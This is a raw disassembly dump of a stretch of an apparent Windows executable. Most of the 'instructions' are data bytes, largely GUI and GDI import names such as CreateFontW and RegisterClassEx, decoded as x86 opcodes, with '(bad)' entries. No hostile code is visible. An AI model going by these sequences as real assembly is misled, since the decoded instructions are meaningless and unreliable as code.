  426629:	jb     0x42662b
  42662b:	add    BYTE PTR [ecx+0x74626d03],bh
  426631:	outs   dx,DWORD PTR ds:[esi]
  426632:	ja     0x426697
  426634:	add    BYTE PTR [eax],al
  426636:	push   es
  426637:	add    al,0x74
  426639:	imul   ebp,DWORD PTR [ebp+0x65],0x720000
  426640:	pop    edi
  426641:	pop    edi
  426642:	addr16 gs je 0x4266b3
  426646:	popa   
  426647:	imul   ebp,DWORD PTR [esi+0x61],0x736772
  42664e:	and    DWORD PTR [edi+esi*2],eax
  426651:	arpl   WORD PTR [ebx+0x63],si
  426654:	jo     0x4266cf
  426656:	add    BYTE PTR [eax],al
  426658:	xchg   ebp,eax
  426659:	add    ebp,DWORD PTR [ecx+0x73]
  42665c:	popa   
  42665d:	ins    BYTE PTR es:[edi],dx
  42665e:	jo     0x4266c8
  426660:	popa   
  426661:	add    BYTE PTR [esi],dl
  426663:	add    al,0x76
  426665:	jae    0x4266d7
  426667:	jb     0x4266d2
  426669:	outs   dx,BYTE PTR ds:[esi]
  42666a:	je     0x4266d2
  42666c:	add    BYTE PTR [eax],al
  42666e:	dec    ebp
  42666f:	push   ebx
  426670:	push   esi
  426671:	inc    ebx
  426672:	push   edx
  426673:	push   esp
  426674:	cs fs ins BYTE PTR es:[edi],dx
  426677:	ins    BYTE PTR es:[edi],dx
  426678:	add    BYTE PTR [eax],al
  42667a:	xchg   DWORD PTR [eax],eax
  42667c:	inc    ebx
  42667d:	jb     0x4266e4
  42667f:	popa   
  426680:	je     0x4266e7
  426682:	inc    edx
  426683:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0xc1000070
  42668b:	add    DWORD PTR [edx+0x65],edx
  42668e:	ins    DWORD PTR es:[edi],dx
  42668f:	outs   dx,DWORD PTR ds:[esi]
  426690:	jbe    0x4266f7
  426692:	inc    esi
  426693:	outs   dx,DWORD PTR ds:[esi]
  426694:	outs   dx,BYTE PTR ds:[esi]
  426695:	je     0x4266e9
  426697:	gs jae 0x426709
  42669a:	jne    0x42670e
  42669c:	arpl   WORD PTR [ebp+0x57],sp
  42669f:	add    BYTE PTR [edi],bh
  4266a1:	add    DWORD PTR [edi+0x65],eax
  4266a4:	je     0x4266ea
  4266a6:	dec    ecx
  4266a7:	inc    edx
  4266a8:	inc    ebx
  4266a9:	outs   dx,DWORD PTR ds:[esi]
  4266aa:	ins    BYTE PTR es:[edi],dx
  4266ab:	outs   dx,DWORD PTR ds:[esi]
  4266ac:	jb     0x426702
  4266ae:	popa   
  4266af:	bound  ebp,QWORD PTR [ebp+eiz*2+0x0]
  4266b3:	add    BYTE PTR [esi+0x1],ch
  4266b6:	inc    edi
  4266b7:	gs je  0x42670a
  4266ba:	imul   edi,DWORD PTR [eax+0x65],0xb900006c
  4266c1:	add    DWORD PTR [edx+0x65],edx
  4266c4:	arpl   WORD PTR [ecx+ecx*2+0x6e],si
  4266c8:	push   edx
  4266c9:	imul   ebp,DWORD PTR gs:[bx+0x6e],0x13a0000
  4266d2:	inc    edi
  4266d3:	gs je  0x426719
  4266d6:	jne    0x42674a
  4266d8:	jb     0x42673f
  4266da:	outs   dx,BYTE PTR ds:[esi]
  4266db:	je     0x42672c
  4266dd:	bound  ebp,QWORD PTR [edx+0x65]
  4266e0:	arpl   WORD PTR [eax+eax*1+0x0],si
  4266e4:	test   DWORD PTR [ecx],eax
  4266e6:	inc    edi
  4266e7:	gs je  0x42673e
  4266ea:	gs js  0x426761
  4266ed:	inc    ebp
  4266ee:	js     0x426764
  4266f0:	outs   dx,BYTE PTR gs:[esi]
  4266f2:	je     0x426744
  4266f4:	outs   dx,DWORD PTR ds:[esi]
  4266f5:	imul   ebp,DWORD PTR [esi+0x74],0xab0041
  4266fc:	inc    ebx
  4266fd:	jb     0x426764
  4266ff:	popa   
  426700:	je     0x426767
  426702:	push   edx
  426703:	arpl   WORD PTR gs:[edx+edx*2+0x67],si
  426708:	outs   dx,BYTE PTR ds:[esi]
  426709:	add    BYTE PTR [ecx+eax*1+0x42746150],ah
  426710:	ins    BYTE PTR es:[edi],dx
  426711:	je     0x426713
  426713:	add    BYTE PTR [ebx+0x74654701],cl
  426719:	push   esp
  42671a:	gs js  0x426791
  42671d:	dec    ebp
  42671e:	gs je  0x426793
  426721:	imul   esp,DWORD PTR [ebx+0x73],0xb10057
  426728:	inc    esp
  426729:	push   eax
  42672a:	je     0x42679b
  42672c:	dec    esp
  42672d:	push   eax
  42672e:	add    BYTE PTR [eax],al
  426730:	popf   
  426731:	add    BYTE PTR [ebx+0x72],al
  426734:	gs popa 
  426736:	je     0x42679d
  426738:	inc    esi
  426739:	outs   dx,DWORD PTR ds:[esi]
  42673a:	outs   dx,BYTE PTR ds:[esi]
  42673b:	je     0x426786
  42673d:	outs   dx,BYTE PTR ds:[esi]
  42673e:	imul   esi,DWORD PTR fs:[edx+0x65],0x577463
  426746:	aad    0x1
  426748:	push   ebx
  426749:	gs je  0x42678e
  42674c:	imul   ecx,DWORD PTR [ebp+0x6f],0x64
  426750:	add    BYTE PTR gs:[esi+0x646e4500],bh
  426757:	inc    esp
  426758:	outs   dx,DWORD PTR ds:[esi]
  426759:	arpl   WORD PTR [eax],ax
  42675b:	add    bh,dl
  42675d:	add    BYTE PTR [esi+0x69],al
  426760:	ins    BYTE PTR es:[edi],dx
  426761:	ins    BYTE PTR es:[edi],dx
  426762:	push   edx
  426763:	outs   dx,BYTE PTR ds:[si]
  426765:	add    BYTE PTR [ecx],al
  426767:	add    dl,BYTE PTR [ebx+0x65]
  42676a:	je     0x4267c3
  42676c:	imul   ebp,DWORD PTR [esi+0x64],0x724f776f
  426773:	addr16 inc ebp
  426775:	js     0x426777
  426777:	add    ch,al
  426779:	add    DWORD PTR [edx+0x65],edx
  42677c:	jae    0x4267f2
  42677e:	outs   dx,DWORD PTR ds:[esi]
  42677f:	jb     0x4267e6
  426781:	inc    esp
  426782:	inc    ebx
  426783:	add    BYTE PTR [eax+0x65724300],ah
  426789:	popa   
  42678a:	je     0x4267f1
  42678c:	dec    eax
  42678d:	popa   
  42678e:	je     0x4267f3
  426790:	push   0x73757242
  426795:	push   0x1d00000
  42679a:	push   ebx
  42679b:	gs je  0x4267df
  42679e:	bound  ebp,QWORD PTR [edi+0x72]
  4267a1:	je     0x4267f3
  4267a3:	jb     0x426814
  4267a5:	arpl   WORD PTR [eax],ax
  4267a7:	add    BYTE PTR [edi+0x1],bl
  4267aa:	inc    edi
  4267ab:	gs je  0x4267fb
  4267ae:	popa   
  4267af:	jo     0x4267fe
  4267b1:	outs   dx,DWORD PTR ds:[esi]
  4267b2:	fs add BYTE PTR gs:[eax],al
  4267b6:	test   BYTE PTR [ecx],0x53
  4267b9:	gs je  0x42680f
  4267bc:	je     0x426830
  4267be:	gs je  0x426824
  4267c1:	push   0x4d746c42
  4267c6:	outs   dx,DWORD PTR ds:[esi]
  4267c7:	fs add BYTE PTR gs:[esi+0x1],dh
  4267cc:	inc    edi
  4267cd:	gs je  0x426822
  4267d0:	outs   dx,BYTE PTR ds:[si]
  4267d2:	inc    edx
  4267d3:	outs   dx,DWORD PTR ds:[esi]
  4267d4:	js     0x4267d6
  4267d6:	stos   BYTE PTR es:[edi],al
  4267d7:	add    BYTE PTR [ebx+0x72],al
  4267da:	gs popa 
  4267dc:	je     0x426843
  4267de:	push   eax
  4267df:	outs   dx,DWORD PTR ds:[esi]
  4267e0:	ins    BYTE PTR es:[edi],dx
  4267e1:	jns    0x42684a
  4267e3:	outs   dx,DWORD PTR ds:[esi]
  4267e4:	outs   dx,BYTE PTR ds:[esi]
  4267e5:	push   edx
  4267e6:	outs   dx,BYTE PTR ds:[si]
  4267e8:	add    BYTE PTR [eax],al
  4267ea:	mov    DWORD PTR [ecx],0x65766153
  4267f0:	inc    esp
  4267f1:	inc    ebx
  4267f2:	add    BYTE PTR [eax],al
  4267f4:	sahf   
  4267f5:	add    BYTE PTR [ebx+0x72],al
  4267f8:	gs popa 
  4267fa:	je     0x426861
  4267fc:	inc    esi
  4267fd:	outs   dx,DWORD PTR ds:[esi]
  4267fe:	outs   dx,BYTE PTR ds:[esi]
  4267ff:	je     0x426858
  426801:	add    BYTE PTR [edi+0x646e4500],bh
  426807:	push   eax
  426808:	popa   
  426809:	addr16 gs add ch,bl
  42680d:	add    DWORD PTR [ebx+0x65],edx
  426810:	je     0x426856
  426812:	dec    ecx
  426813:	inc    edx
  426814:	imul   esi,DWORD PTR [ebx+esi*2+0x0],0x64410070
  42681c:	fs inc esi
  42681e:	outs   dx,DWORD PTR ds:[esi]
  42681f:	outs   dx,BYTE PTR ds:[esi]
  426820:	je     0x426874
  426822:	gs jae 0x426894
  426825:	jne    0x426899
  426827:	arpl   WORD PTR [ebp+0x57],sp
  42682a:	add    BYTE PTR [eax],al
  42682c:	xchg   ebp,eax
  42682d:	add    DWORD PTR [eax+edx*2+0x74],ecx
  426831:	outs   dx,DWORD PTR ds:[esi]
  426832:	inc    esp
  426833:	push   eax
  426834:	add    BYTE PTR [eax],al
  426836:	mov    DWORD PTR [eax],eax
  426838:	inc    ebx
  426839:	jb     0x4268a0
  42683b:	popa   
  42683c:	je     0x4268a3
  42683e:	inc    edx
  42683f:	jb     0x4268b6
  426841:	jae    0x4268ab
  426843:	dec    ecx
  426844:	outs   dx,BYTE PTR ds:[esi]
  426845:	imul   esi,DWORD PTR fs:[edx+0x65],0x5c007463
  42684d:	add    DWORD PTR [edi+0x65],eax
  426850:	je     0x42689e
  426852:	popa   
  426853:	jns    0x4268c4
  426855:	jne    0x4268cb
  426857:	add    BYTE PTR [ebx+0x1],bh
  42685a:	inc    edi
  42685b:	gs je  0x4268b2
  42685e:	gs js  0x4268d5
  426861:	inc    ecx
  426862:	ins    BYTE PTR es:[edi],dx
  426863:	imul   esp,DWORD PTR [edi+0x6e],0x18a0000
  42686a:	inc    edi
  42686b:	gs je  0x4268c2
  42686e:	gs js  0x4268e5
  426871:	dec    ebp
  426872:	gs je  0x4268e7
  426875:	imul   esp,DWORD PTR [ebx+0x73],0x1ba0041
  42687c:	push   edx
  42687d:	arpl   WORD PTR gs:[esi+edx*2+0x69],si
  426882:	jae    0x4268ed
  426884:	bound  ebp,QWORD PTR [ebp+eiz*2+0x0]
  426888:	cli    
  426889:	add    DWORD PTR [ebx+0x65],edx
  42688c:	je     0x4268e2
  42688e:	gs js  0x426905
  426891:	inc    ebx
  426892:	outs   dx,DWORD PTR ds:[esi]
  426893:	ins    BYTE PTR es:[edi],dx
  426894:	outs   dx,DWORD PTR ds:[esi]
  426895:	jb     0x426897
  426897:	add    BYTE PTR [eax+0x1],al
  42689a:	inc    edi
  42689b:	gs je  0x4268e2
  42689e:	dec    ecx
  42689f:	inc    edx
  4268a0:	imul   esi,DWORD PTR [ebx+esi*2+0x0],0x74530205
  4268a8:	popa   
  4268a9:	jb     0x42691f
  4268ab:	push   eax
  4268ac:	popa   
  4268ad:	add    BYTE PTR gs:[bp+si+0x4300],dl
  4268b3:	jb     0x42691a
  4268b5:	popa   
  4268b6:	je     0x42691d
  4268b8:	inc    esp
  4268b9:	dec    ecx
  4268ba:	inc    edx
  4268bb:	push   ebx
  4268bc:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  4268c1:	outs   dx,BYTE PTR ds:[esi]
  4268c2:	add    BYTE PTR [eax],al
  4268c4:	rol    BYTE PTR [eax],0x45
  4268c7:	outs   dx,BYTE PTR ds:[esi]
  4268c8:	fs push eax
  4268ca:	popa   
  4268cb:	je     0x426935
  4268cd:	add    BYTE PTR [eax+0x65724300],cl
  4268d3:	popa   
  4268d4:	je     0x42693b
  4268d6:	inc    edx
  4268d7:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0x646e4970
  4268df:	imul   esi,DWORD PTR [edx+0x65],0x7463
  4268e6:	test   BYTE PTR [ecx],al
  4268e8:	inc    edi
  4268e9:	gs je  0x426940
  4268ec:	gs js  0x426963
  4268ef:	inc    ebp
  4268f0:	js     0x426966
  4268f2:	outs   dx,BYTE PTR gs:[esi]
  4268f4:	je     0x426946
  4268f6:	outs   dx,DWORD PTR ds:[esi]
  4268f7:	imul   ebp,DWORD PTR [esi+0x74],0x573233
  4268fe:	mov    ebx,0x63655201
  426903:	je     0x426966
  426905:	outs   dx,BYTE PTR ds:[esi]
  426906:	ins    BYTE PTR es:[di],dx
  426908:	add    BYTE PTR gs:[ebp+0x74615001],ah
  42690f:	push   0x65526f54
  426914:	imul   ebp,DWORD PTR [bx+0x6e],0x1690000
  42691c:	inc    edi
  42691d:	gs je  0x42696f
  426920:	bound  ebp,QWORD PTR [edx+0x65]
  426923:	arpl   WORD PTR [edi+edx*2+0x0],si
  426927:	add    BYTE PTR [edi+0x44],al
  42692a:	dec    ecx
  42692b:	xor    esi,DWORD PTR [edx]
  42692d:	cs fs ins BYTE PTR es:[edi],dx
  426930:	ins    BYTE PTR es:[edi],dx
  426931:	add    BYTE PTR [ebx+0x68],ch
  426934:	pop    edx
  426935:	jp     0x4269a9
  426937:	jp     0x4269ad
  426939:	push   ebx
  42693a:	add    ch,BYTE PTR [ebp+0x42]
  42693d:	add    BYTE PTR [edx],cl
  42693f:	ins    DWORD PTR es:[edi],dx
  426940:	inc    edx
  426941:	add    BYTE PTR [edx-0x10ffbd95],al
  426947:	or     esi,DWORD PTR [edx+0x324f7d0e]
  42694d:	dec    edi
  42694e:	addr16 dec edi
  426950:	xor    DWORD PTR [edi+0x4f],ecx
  426953:	dec    edi
  426954:	cmp    al,0x4f
  426956:	jp     0x4269a7
  426958:	cmp    ecx,DWORD PTR [edi+0x5e]
  42695b:	dec    edi
  42695c:	es dec edi
  42695e:	jae    0x4269af
  426960:	and    eax,0x224f324f
  426965:	dec    edi
  426966:	push   ds
  426967:	push   edx
  426968:	pop    ds
  426969:	push   ebx
  42696a:	cmp    eax,0x324f7d4f
  42696f:	dec    edi
  426970:	addr16 dec edi
  426972:	xor    DWORD PTR [edi+0x4f],ecx
  426975:	dec    edi
  426976:	cmp    al,0x4f
  426978:	jp     0x4269c9
  42697a:	cmp    ecx,DWORD PTR [edi+0x5e]
  42697d:	dec    edi
  42697e:	es dec edi
  426980:	ins    DWORD PTR es:[edi],dx
  426981:	dec    edi
  426982:	and    eax,0x224f324f
  426987:	dec    edi
  426988:	push   ds
  426989:	bound  ebx,QWORD PTR [edi]
  42698b:	arpl   WORD PTR ds:0x324f7d4f,di
  426991:	dec    edi
  426992:	bound  ecx,QWORD PTR [edi+0x31]
  426995:	dec    edi
  426996:	jae    0x4269e7
  426998:	cmp    eax,0x384f404f
  42699d:	dec    edi
  42699e:	xor    cl,BYTE PTR [edi+0x24]
  4269a1:	dec    edi
  4269a2:	push   ds
  4269a3:	jb     0x4269c4
  4269a5:	jae    0x4269b6
  4269a7:	or     DWORD PTR [eax+eax*4],0x7c
  4269ab:	nop
  4269ac:	jge    0x42693f
  4269ae:	aas    
  4269af:	dec    edi
  4269b0:	dec    di
  4269b2:	xor    cl,BYTE PTR [edi+0x66]
  4269b5:	dec    edi
  4269b6:	ds dec edi
  4269b8:	inc    eax
  4269b9:	dec    edi
  4269ba:	cmp    eax,0x394f734f
  4269bf:	dec    edi
  4269c0:	xor    cl,BYTE PTR [edi+0x26]
  4269c3:	dec    edi
  4269c4:	push   ds
  4269c5:	sbb    BYTE PTR [edi],0x83
  4269c8:	setae  BYTE PTR [eax+edx*4]
  4269cc:	jl     0x42696e
  4269ce:	jge    0x426971
  4269d0:	aas    
  4269d1:	dec    edi
  4269d2:	dec    di
  4269d4:	xor    cl,BYTE PTR [edi+0x66]
  4269d7:	dec    edi
  4269d8:	ds dec edi
  4269da:	inc    eax
  4269db:	dec    edi
  4269dc:	cmp    eax,0x394f6d4f
  4269e1:	dec    edi
  4269e2:	xor    cl,BYTE PTR [edi+0x26]
  4269e5:	dec    edi
  4269e6:	push   ds
  4269e7:	xchg   edx,eax
  4269e8:	pop    ds
  4269e9:	xchg   ebx,eax
  4269ea:	bt     DWORD PTR [eax+eiz*4],ecx
  4269ee:	jl     0x4269a0
  4269f0:	jge    0x4269a3
  4269f2:	aas    
  4269f3:	dec    edi
  4269f4:	ins    BYTE PTR es:[edi],dx
  4269f5:	dec    edi
  4269f6:	xor    cl,BYTE PTR [edi+0x4e]
  4269f9:	dec    edi
  4269fa:	xor    DWORD PTR [edi+0x73],ecx
  4269fd:	dec    edi
  4269fe:	cmp    eax,0x384f454f
  426a03:	dec    edi
  426a04:	xor    cl,BYTE PTR [edi+0x26]
  426a07:	dec    edi
  426a08:	push   ds
  426a09:	mov    ds:0xb30fa31f,al
  426a0e:	or     al,0xb0
  426a10:	jl     0x4269d2
  426a12:	jge    0x4269d5
  426a14:	aas    
  426a15:	dec    edi
  426a16:	ins    BYTE PTR es:[edi],dx
  426a17:	dec    edi
  426a18:	xor    cl,BYTE PTR [edi+0x4e]
  426a1b:	dec    edi
  426a1c:	xor    DWORD PTR [edi+0x7c],ecx
  426a1f:	dec    edi
  426a20:	cmp    eax,0x3b4f5f4f
  426a25:	dec    edi
  426a26:	xor    cl,BYTE PTR [edi+0x39]
  426a29:	dec    edi
  426a2a:	push   ds
  426a2b:	mov    dl,0x1f
  426a2d:	mov    bl,0xf
  426a2f:	ret    
  426a30:	or     al,0xc0
  426a32:	jl     0x426a04
  426a34:	jge    0x426a07
  426a36:	aas    
  426a37:	dec    edi
  426a38:	ins    BYTE PTR es:[edi],dx
  426a39:	dec    edi
  426a3a:	xor    cl,BYTE PTR [edi+0x4e]
  426a3d:	dec    edi
  426a3e:	xor    DWORD PTR [edi+0x62],ecx
  426a41:	dec    edi
  426a42:	cmp    eax,0x384f4e4f
  426a47:	dec    edi
  426a48:	xor    cl,BYTE PTR [edi+0x24]
  426a4b:	dec    edi
  426a4c:	push   ds
  426a4d:	ret    0xc31f
  426a50:	psrlq  mm1,QWORD PTR [eax+edx*8]
  426a54:	jl     0x426a36
  426a56:	jge    0x426a39
  426a58:	aas    
  426a59:	dec    edi
  426a5a:	ins    BYTE PTR es:[edi],dx
  426a5b:	dec    edi
  426a5c:	xor    cl,BYTE PTR [edi+0x4e]
  426a5f:	dec    edi
  426a60:	xor    DWORD PTR [edi+0x63],ecx
  426a63:	dec    edi
  426a64:	cmp    eax,0x384f404f
  426a69:	dec    edi
  426a6a:	xor    cl,BYTE PTR [edi+0x26]
  426a6d:	dec    edi
  426a6e:	push   ds
  426a6f:	rcr    BYTE PTR [edi],cl
  426a71:	ror    DWORD PTR [edi],cl
  426a73:	jecxz  0x426a81
  426a75:	loopne 0x426af3
  426a77:	lock jge 0x426a6b
  426a7a:	aas    
  426a7b:	dec    edi
  426a7c:	popa   
  426a7d:	dec    edi
  426a7e:	xor    cl,BYTE PTR [edi+0x5f]
  426a81:	dec    edi
  426a82:	xor    DWORD PTR [edi+0x42],ecx
  426a85:	dec    edi
  426a86:	ds dec edi
  426a88:	xor    cl,BYTE PTR [edi+0x3f]
  426a8b:	dec    edi
  426a8c:	push   ds
  426a8d:	loop   0x426aae
  426a8f:	jecxz  0x426aa0
  426a91:	repz or al,0xf0
  426a94:	jl     0x426a96
  426a96:	jge    0x426a99
  426a98:	jl     0x426aaa
  426a9a:	jge    0x426aad
  426a9c:	ds dec edi
  426a9e:	jg     0x426aef
  426aa0:	xor    cl,BYTE PTR [edi+0x5b]
  426aa3:	dec    edi
  426aa4:	xor    BYTE PTR [edi+0x62],cl
  426aa7:	dec    edi
  426aa8:	ds dec edi
  426aaa:	inc    ecx
  426aab:	dec    edi
  426aac:	cmp    ecx,DWORD PTR [edi+0x32]
  426aaf:	dec    edi
  426ab0:	cmp    DWORD PTR [edi+0x1e],ecx
  426ab3:	add    bl,BYTE PTR [edi]
  426ab5:	add    ecx,DWORD PTR [edi]
  426ab7:	adc    ecx,DWORD PTR [eax+edx*1]
  426aba:	jl     0x426adc
  426abc:	jge    0x426adf
  426abe:	aas    
  426abf:	dec    edi
  426ac0:	add    BYTE PTR [eax],al
  426ac2:	dec    edx
  426ac3:	imul   eax,DWORD PTR [edx+0x0],0x426b3e
  426aca:	inc    esi
  426acb:	imul   eax,DWORD PTR [edx+0x0],0xe
  426acf:	ins    DWORD PTR es:[edi],dx
  426ad0:	inc    edx
  426ad1:	add    BYTE PTR [edx+0x6c],dh
  426ad4:	inc    edx
  426ad5:	add    dh,bh
  426ad7:	ins    BYTE PTR es:[edi],dx
  426ad8:	inc    edx
  426ad9:	add    BYTE PTR [esi],ah
  426adb:	imul   eax,DWORD PTR [edx+0x0],0x2a
  426adf:	imul   eax,DWORD PTR [edx+0x0],0xfffffff6
  426ae3:	ins    BYTE PTR es:[edi],dx
  426ae4:	inc    edx
  426ae5:	add    BYTE PTR [esi-0x4effbd95],cl
  426aeb:	test   eax,0xbab8f89c
  426af0:	pushf  
  426af1:	clc    
  426af2:	inc    edx
  426af3:	imul   eax,DWORD PTR [edx+0x0],0x2e
  426af7:	ins    BYTE PTR es:[edi],dx
  426af8:	inc    edx
  426af9:	add    BYTE PTR [edx+0x6c],al
  426afc:	inc    edx
  426afd:	add    BYTE PTR [esi+0x6c],cl
  426b00:	inc    edx
  426b01:	add    BYTE PTR [esi+0x6c],bl
  426b04:	inc    edx
  426b05:	add    BYTE PTR [edx+0x6b],bh
  426b08:	inc    edx
  426b09:	add    BYTE PTR [esi+0x69],al
  426b0c:	inc    edx
  426b0d:	add    BYTE PTR [edx-0x75ffbd95],bl
  426b13:	imul   eax,DWORD PTR [edx+0x0],0x12
  426b17:	ins    DWORD PTR es:[edi],dx
  426b18:	inc    edx
  426b19:	add    BYTE PTR [eax],bh
  426b1b:	test   DWORD PTR [eax+edi*8-0x7ee8f463],ebx
  426b22:	dec    esi
  426b23:	imul   eax,DWORD PTR [edx+0x0],0xffffff9a
  426b27:	sbb    al,0x16
  426b29:	or     DWORD PTR [esi+0x7050d],0x3a004000
  426b33:	call   0xa2f84a73
  426b38:	inc    edx
  426b39:	add    BYTE PTR [ebx+0x65],al
  426b3c:	addr16 inc esp
  426b3e:	mov    ?,edx
  426b40:	jne    0x426ba4
  426b42:	mov    gs,ebp
  426b44:	inc    BYTE PTR [edi]
  426b46:	mov    edi,0x3605a3fa
  426b4b:	imul   eax,DWORD PTR [edx+0x0],0x39
  426b4f:	xchg   ebp,eax
  426b50:	pushf  
  426b51:	clc    
  426b52:	cmp    DWORD PTR [esi-0x6ac50764],edx
  426b58:	pushf  
  426b59:	clc    
  426b5a:	cmp    edx,DWORD PTR [ebp-0x6ac30764]
  426b60:	pushf  
  426b61:	clc    
  426b62:	cmp    eax,0x3ef89c95
  426b67:	xchg   ebp,eax
  426b68:	pushf  
  426b69:	clc    
  426b6a:	aas    
  426b6b:	xchg   ebp,eax
  426b6c:	pushf  
  426b6d:	clc    
  426b6e:	and    BYTE PTR [ebp-0x6ade0764],dl
  426b74:	pushf  
  426b75:	clc    
  426b76:	sub    BYTE PTR [ebp-0x6130764],dl
  426b7c:	add    esp,DWORD PTR [eax+0x3e]
  426b7f:	imul   eax,DWORD PTR [edx+0x0],0x426d8a
  426b86:	push   edi
  426b87:	dec    edx
  426b88:	ins    BYTE PTR es:[edi],dx
  426b89:	popa   
  426b8a:	cmp    BYTE PTR [ebp-0x16620764],al
  426b90:	push   eax
  426b91:	pop    es
  426b92:	lds    eax,FWORD PTR [esi]
  426b94:	add    BYTE PTR [eax],al
  426b96:	cmp    ch,BYTE PTR [ecx+0x42]
  426b99:	add    BYTE PTR [ebx+0xe040b],bl
	...
  426bcb:	add    BYTE PTR [eax],al
  426bcd:	add    BYTE PTR [edi+0x36],bl
  426bd0:	inc    edx
  426bd1:	add    BYTE PTR [esi+0x427d],ch
  426bd7:	add    BYTE PTR [eax],al
  426bd9:	add    BYTE PTR [eax+eax*1+0x4a],al
  426bdd:	add    BYTE PTR [ebx+0x0],cl
  426be0:	push   ebp
  426be1:	add    BYTE PTR [ebx+0x0],ch
  426be4:	ins    BYTE PTR es:[edi],dx
  426be5:	add    BYTE PTR [edx+0x0],ch
  426be8:	inc    esp
  426be9:	add    BYTE PTR [edx+0x0],cl
  426bec:	dec    ebx
  426bed:	add    BYTE PTR [eax+eax*1+0x4b],cl
  426bf1:	add    BYTE PTR [edx+0x0],cl
  426bf4:	inc    esp
  426bf5:	add    BYTE PTR [ebp+0x0],dl
  426bf8:	dec    ecx
  426bf9:	add    BYTE PTR [eax+eax*1+0x4c],al
  426bfd:	add    BYTE PTR [eax+eax*1+0x4a],cl
  426c01:	add    BYTE PTR [ebx+0x0],cl
  426c04:	inc    esp
  426c05:	add    BYTE PTR [ecx+0x0],cl
  426c08:	push   ebp
  426c09:	add    BYTE PTR [eax+eax*1+0x49],al
  426c0d:	add    BYTE PTR [edi+0x0],cl
  426c10:	ins    BYTE PTR es:[edi],dx
  426c11:	add    BYTE PTR [edx+0x0],ch
  426c14:	imul   eax,DWORD PTR [eax],0x64
  426c17:	add    BYTE PTR [eax],al
  426c19:	add    dl,bl
  426c1b:	imul   eax,DWORD PTR [edx+0x0],0xffffff8e
  426c1f:	cli    
  426c20:	jne    0x426c93
	...
  426c2a:	lock cmp al,BYTE PTR [edx+0x0]
  426c2e:	pop    ecx
  426c2f:	dec    edi
  426c30:	pop    edi
  426c31:	dec    edi
  426c32:	inc    eax
  426c33:	dec    edi
  426c34:	inc    esp
  426c35:	dec    edi
  426c36:	pop    edi
  426c37:	dec    edi
  426c38:	inc    esi
  426c39:	dec    edi
  426c3a:	add    DWORD PTR [edi+0x0],ecx
  426c3d:	dec    edi
  426c3e:	xor    cl,BYTE PTR [edi+0x0]
  426c41:	add    BYTE PTR [ebp+0x4f],bl
  426c44:	pop    esi
  426c45:	dec    edi
  426c46:	pop    ebx
  426c47:	dec    edi
  426c48:	add    DWORD PTR [edi+0x0],ecx
  426c4b:	dec    edi
  426c4c:	xor    cl,BYTE PTR [edi+0x4f]
  426c4f:	dec    edi
  426c50:	inc    ecx
  426c51:	dec    edi
  426c52:	pop    edi
  426c53:	dec    edi
  426c54:	inc    eax
  426c55:	dec    edi
  426c56:	add    DWORD PTR [edi+0x0],ecx
  426c59:	dec    edi
  426c5a:	xor    cl,BYTE PTR [edi+0x0]
  426c5d:	add    BYTE PTR [ecx+0x4f],al
  426c60:	pop    edx
  426c61:	dec    edi
  426c62:	inc    esi
  426c63:	dec    edi
  426c64:	dec    ebp
  426c65:	dec    edi
  426c66:	push   ebx
  426c67:	dec    edi
  426c68:	inc    edx
  426c69:	dec    edi
  426c6a:	pop    ebx
  426c6b:	dec    edi
  426c6c:	xor    cl,BYTE PTR [edi+0x0]
  426c6f:	add    BYTE PTR [eax],al
  426c71:	add    BYTE PTR [esi+0x7d],ch
  426c74:	outs   dx,BYTE PTR ds:[esi]
  426c75:	lea    ebp,[esi-0x63]
  426c78:	outs   dx,BYTE PTR ds:[esi]
  426c79:	lods   eax,DWORD PTR ds:[esi]
  426c7a:	outs   dx,BYTE PTR ds:[esi]
  426c7b:	mov    ebp,0xdd6ecd6e
  426c80:	outs   dx,BYTE PTR ds:[esi]
  426c81:	in     eax,dx
  426c82:	outs   dx,BYTE PTR ds:[esi]
  426c83:	std    
  426c84:	outs   dx,BYTE PTR ds:[esi]
  426c85:	or     eax,0x2d6e1d6e
  426c8a:	outs   dx,BYTE PTR ds:[esi]
  426c8b:	cmp    eax,0x6d6e5d6e
  426c90:	outs   dx,BYTE PTR ds:[esi]
  426c91:	jb     0x426d01
  426c93:	jae    0x426d03
  426c95:	jo     0x426d05
  426c97:	jno    0x426d07
  426c99:	jbe    0x426d09
  426c9b:	ja     0x426d0b
  426c9d:	je     0x426d0d
  426c9f:	jne    0x426d0f
  426ca1:	mov    ch,BYTE PTR [esi-0x75]
  426ca4:	outs   dx,BYTE PTR ds:[esi]
  426ca5:	mov    BYTE PTR [esi-0x77],ch
  426ca8:	outs   dx,BYTE PTR ds:[esi]
  426ca9:	mov    gs,WORD PTR [esi+0x7c]
  426cac:	pop    esi
  426cad:	jge    0x426cfd
  426caf:	jge    0x426c6f
  426cb1:	jge    0x426d0f
  426cb3:	(bad)  
  426cb4:	jge    0x426d26
  426cb6:	mov    ebp,0x71736eb1
  426cbb:	bound  ebp,QWORD PTR [edx+0x70265fc6]
  426cc1:	add    BYTE PTR [ebp+0x17],cl
  426cc4:	mov    ebx,0x4af4bd56
  426cc9:	aaa    
  426cca:	dec    edx
  426ccb:	jle    0x426c6a
  426ccd:	jno    0x426d23
  426ccf:	mov    cl,0x8
  426cd1:	imul   ebp,DWORD PTR [eax+ecx*1+0x58fd7d8],0x48
  426cd9:	xlat   BYTE PTR ds:[ebx]
  426cda:	lds    edx,FWORD PTR [ebx+0x7dc4114c]
  426ce0:	ret    
  426ce1:	fidiv  WORD PTR [edi]
  426ce3:	into   
  426ce4:	mul    BYTE PTR [esi+0x1faa3204]
  426cea:	push   0xc5c644f1
  426cef:	sbb    ch,al
  426cf1:	jno    0x426cf3
  426cf3:	add    BYTE PTR [eax],al
  426cf5:	add    dh,ch
  426cf7:	(bad)  [ebx+0x7]
  426cfa:	xchg   esi,eax
  426cfb:	imul   eax,DWORD PTR [edx+0x0],0x34
  426cff:	pop    ds
  426d00:	mov    al,0x22
  426d02:	int3   
  426d03:	push   ecx
  426d04:	inc    edx
  426d05:	add    BYTE PTR [ecx+0x6b],bh
  426d08:	dec    edx
  426d09:	jae    0x426d39
  426d0b:	imul   eax,DWORD PTR [edx+0x0],0xffffff92
  426d0f:	imul   eax,DWORD PTR [edx+0x0],0xffffff8e
  426d13:	in     eax,dx
  426d14:	adc    al,BYTE PTR [edi]
	...
  426d36:	addr16 push ebx
  426d38:	push   ecx
  426d39:	pop    eax
  426d3a:	jb     0x426db6
  426d3c:	inc    esp
  426d3d:	inc    ecx
